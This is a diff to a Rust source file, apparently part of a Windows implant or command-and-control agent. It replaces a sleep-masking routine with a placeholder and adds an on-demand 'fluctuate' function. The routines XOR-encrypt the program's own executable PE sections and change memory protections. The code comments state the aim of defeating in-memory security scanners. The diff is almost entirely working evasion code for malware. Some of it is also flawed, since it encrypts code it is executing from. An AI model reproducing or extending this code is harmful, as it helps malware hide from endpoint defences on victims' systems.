@@ -107,94 +107,43 @@ pub fn in_working_hours(spec: &str) -> bool {
     }
 }
 
-/// XOR-mask all executable PE sections during sleep to defeat in-memory scanners.
-/// Sections are set PAGE_NOACCESS while sleeping; original protections are restored after.
+/// Sleep for `ms` milliseconds. Placeholder for Ekko-style sleep masking (timer+ROP).
+// Real implementation requires the protect/XOR to happen while execution is in ntdll,
+// not in .text — a future work item requiring SetWaitableTimer + RtlCaptureContext.
 pub fn sleep_masked(ms: u64) {
+    std::thread::sleep(std::time::Duration::from_millis(ms));
+}
+
+/// XOR all executable PE sections with a key byte (encrypt or decrypt in-place).
+/// Used by MEM_FLUCTUATE command to trigger on-demand masking outside the sleep path.
+pub fn fluctuate_sections(key: u8) {
+    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
+    use windows_sys::Win32::System::Memory::VirtualProtect;
+
     unsafe {
-        use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
-        use windows_sys::Win32::System::Memory::VirtualProtect;
-
-        // Get our own image base (pass NULL → returns the calling module's base)
         let base = GetModuleHandleW(std::ptr::null()) as usize as *mut u8;
-        if base.is_null() {
-            std::thread::sleep(std::time::Duration::from_millis(ms));
-            return;
-        }
-
-        // DOS header: e_lfanew at offset 0x3C gives offset of NT headers
+        if base.is_null() { return; }
         let e_lfanew = *base.add(0x3c).cast::<i32>() as usize;
-        let nt_base = base.add(e_lfanew);
-
-        // Validate PE signature "PE\0\0" (0x00004550)
-        if *nt_base.cast::<u32>() != 0x0000_4550 {
-            std::thread::sleep(std::time::Duration::from_millis(ms));
-            return;
-        }
-
-        // IMAGE_FILE_HEADER fields (relative to PE signature):
-        //   offset  6 → NumberOfSections (u16)
-        //   offset 20 → SizeOfOptionalHeader (u16)
-        let num_sections = *nt_base.add(6).cast::<u16>() as usize;
-        let opt_header_size = *nt_base.add(20).cast::<u16>() as usize;
-
-        // Section headers begin immediately after the optional header
-        // Layout: [PE sig 4B][FileHeader 20B][OptionalHeader N B][Section headers...]
-        let sections_start = nt_base.add(4 + 20 + opt_header_size);
-
-        // IMAGE_SECTION_HEADER = 40 bytes:
-        //   offset  0 → Name           [8 bytes]
-        //   offset  8 → VirtualSize    u32
-        //   offset 12 → VirtualAddress u32
-        //   offset 36 → Characteristics u32
-        let mut regions: Vec<(*mut u8, usize, u32)> = Vec::new();
-
+        let nt_base  = base.add(e_lfanew);
+        if *nt_base.cast::<u32>() != 0x0000_4550 { return; }
+        let num_sections  = *nt_base.add(6).cast::<u16>() as usize;
+        let opt_header_sz = *nt_base.add(20).cast::<u16>() as usize;
+        let sections_start = nt_base.add(4 + 20 + opt_header_sz);
         for i in 0..num_sections {
-            let sec = sections_start.add(i * 40);
-            let virt_size = *sec.add(8).cast::<u32>() as usize;
-            let virt_addr = *sec.add(12).cast::<u32>() as usize;
+            let sec            = sections_start.add(i * 40);
+            let virt_size      = *sec.add(8).cast::<u32>() as usize;
+            let virt_addr      = *sec.add(12).cast::<u32>() as usize;
             let characteristics = *sec.add(36).cast::<u32>();
-
-            // IMAGE_SCN_MEM_EXECUTE = 0x20000000 — only mask executable sections
             if characteristics & 0x2000_0000 != 0 && virt_size > 0 {
-                let region_ptr = base.add(virt_addr);
-                let mut old_prot = 0u32;
-                // Make section writable so we can XOR it
-                if VirtualProtect(
-                    region_ptr as *const _,
-                    virt_size,
-                    0x04, // PAGE_READWRITE
-                    &mut old_prot,
-                ) != 0
-                {
-                    // XOR-encrypt the section bytes
-                    let slice = std::slice::from_raw_parts_mut(region_ptr, virt_size);
-                    for b in slice.iter_mut() {
-                        *b ^= 0xA7;
-                    }
-                    // Set to no-access to defeat memory scanner reads
+                let ptr = base.add(virt_addr);
+                let mut old = 0u32;
+                if VirtualProtect(ptr as *const _, virt_size, 0x04, &mut old) != 0 {
+                    let slice = std::slice::from_raw_parts_mut(ptr, virt_size);
+                    for b in slice.iter_mut() { *b ^= key; }
                     let mut tmp = 0u32;
-                    VirtualProtect(
-                        region_ptr as *const _,
-                        virt_size,
-                        0x01, // PAGE_NOACCESS
-                        &mut tmp,
-                    );
-                    regions.push((region_ptr, virt_size, old_prot));
+                    VirtualProtect(ptr as *const _, virt_size, old, &mut tmp);
                 }
             }
-        }
-
-        std::thread::sleep(std::time::Duration::from_millis(ms));
-
-        // Restore and XOR-decrypt sections in reverse order
-        for (ptr, size, orig_prot) in regions.iter().rev() {
-            let mut tmp = 0u32;
-            VirtualProtect(*ptr as *const _, *size, 0x04, &mut tmp); // PAGE_READWRITE
-            let slice = std::slice::from_raw_parts_mut(*ptr, *size);
-            for b in slice.iter_mut() {
-                *b ^= 0xA7;
-            }
-            VirtualProtect(*ptr as *const _, *size, *orig_prot, &mut tmp);
         }
     }
 }
